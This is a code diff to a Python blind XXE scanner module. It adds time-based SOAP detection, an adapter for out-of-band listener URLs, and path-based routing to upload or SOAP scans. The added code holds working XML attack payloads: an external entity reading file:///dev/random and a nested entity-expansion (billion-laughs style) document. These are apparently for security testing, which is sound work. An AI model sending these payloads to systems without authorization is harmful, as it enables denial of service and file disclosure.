@@ -16,7 +16,10 @@ Integrates seamlessly with the scanner:
 """
 
 import logging
+import time
+import statistics
 from typing import Dict, List, Any, Optional, Tuple
+from urllib.parse import urlparse
 from bsqli.core.http_client import HttpClient
 from bsqli.core.logger import get_logger
 from .detector import BlindXXEDetector
@@ -24,6 +27,21 @@ from . import payloads
 
 
 logger = get_logger(__name__)
+
+
+class _StringOASTAdapter:
+    """Adapter to treat a string listener URL as an OAST server."""
+
+    def __init__(self, base_url: str):
+        self.base_url = (base_url or "").rstrip("/")
+        parsed = urlparse(self.base_url if "://" in self.base_url else f"http://{self.base_url}")
+        self._hostname = parsed.hostname or self.base_url
+
+    def get_http_endpoint(self) -> str:
+        return self.base_url
+
+    def get_dns_domain(self) -> str:
+        return self._hostname
 
 
 class BlindXXEModule:
@@ -58,6 +76,8 @@ class BlindXXEModule:
         """
         # Use shared HttpClient without custom args to match existing signature
         self.http_client = HttpClient(timeout=timeout)
+        if isinstance(oast_server, str):
+            oast_server = _StringOASTAdapter(oast_server)
         self.detector = BlindXXEDetector(self.http_client, oast_server)
         self.timeout = timeout
         self.oast_server = oast_server
@@ -199,8 +219,68 @@ class BlindXXEModule:
             req_headers = headers or {}
             req_headers["Content-Type"] = "application/soap+xml"
             req_headers["SOAPAction"] = ""
+
+            soap_timing_findings: List[Dict[str, Any]] = []
+
+            baseline_payload = """<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <GetData><input>test</input></GetData>
+  </soap:Body>
+</soap:Envelope>"""
+            baseline_times = []
+            for _ in range(2):
+                try:
+                    t0 = time.time()
+                    self.http_client.post(url, data=baseline_payload, headers=req_headers, timeout=self.timeout)
+                    baseline_times.append(time.time() - t0)
+                except Exception:
+                    continue
+
+            baseline_avg = statistics.mean(baseline_times) if baseline_times else 0.5
+            soap_threshold = baseline_avg + 1.5
+
+            soap_time_payloads = [
+                """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE soap:Envelope [
+  <!ENTITY xxe SYSTEM "file:///dev/random">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <GetData><input>&xxe;</input></GetData>
+  </soap:Body>
+</soap:Envelope>""",
+                """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE soap:Envelope [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <GetData><input>&lol3;</input></GetData>
+  </soap:Body>
+</soap:Envelope>""",
+            ]
+
+            soap_time_confirmations = 0
+            for soap_payload in soap_time_payloads:
+                try:
+                    t0 = time.time()
+                    self.http_client.post(url, data=soap_payload, headers=req_headers, timeout=self.timeout)
+                    elapsed = time.time() - t0
+                    if elapsed > soap_threshold:
+                        soap_time_confirmations += 1
+                        soap_timing_findings.append({
+                            "technique": "time_based",
+                            "method": "soap_doctype_delay",
+                            "response_time": round(elapsed, 3),
+                            "baseline_avg": round(baseline_avg, 3),
+                            "threshold": round(soap_threshold, 3),
+                        })
+                except Exception:
+                    continue
             
-            # Generate SOAP payloads
             if self.oast_server:
                 oast_endpoint = self.oast_server.get_http_endpoint()
                 soap_payloads = payloads.soap_xxe_payloads(oast_endpoint)
@@ -217,7 +297,6 @@ class BlindXXEModule:
                     except Exception as e:
                         logger.debug(f"SOAP payload error: {e}")
             
-            # Use detector
             result = self.detector.detect_xml_parameter(
                 url=url,
                 parameter="soap_body",
@@ -225,6 +304,14 @@ class BlindXXEModule:
                 method=method,
                 headers=req_headers
             )
+
+            if soap_time_confirmations >= 1:
+                result["is_vulnerable"] = True
+                result["technique"] = "time_based"
+                existing_findings = result.get("findings", [])
+                result["findings"] = existing_findings + soap_timing_findings
+                if result.get("confidence") not in {"high", "HIGH"}:
+                    result["confidence"] = "medium"
             
             finding = self._result_to_finding(
                 result=result,
@@ -403,22 +490,27 @@ class BlindXXEModule:
         """
         findings = []
 
-        # Scan the URL by testing XML body if it's a POST request
-        result = self.scan_xml_body(
-            url=url,
-            body=body,
-            method=method,
-            headers=headers
-        )
+        path = urlparse(url).path.lower()
 
-        # Convert result to finding if vulnerable
+        if "/upload" in path:
+            result = self.scan_file_upload(url=url, file_param="file", headers=headers)
+        elif "/soap" in path:
+            result = self.scan_soap_endpoint(url=url, method=method, headers=headers)
+        else:
+            result = self.scan_xml_body(
+                url=url,
+                body=body,
+                method=method,
+                headers=headers
+            )
+
         if result.get("is_vulnerable"):
             findings.append(result)
 
         # Also try JSON parameters if we found vulnerable endpoints
         if "?" in url and "=" in url:
             # Extract parameters from URL
-            from urllib.parse import urlparse, parse_qs
+            from urllib.parse import parse_qs
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
             
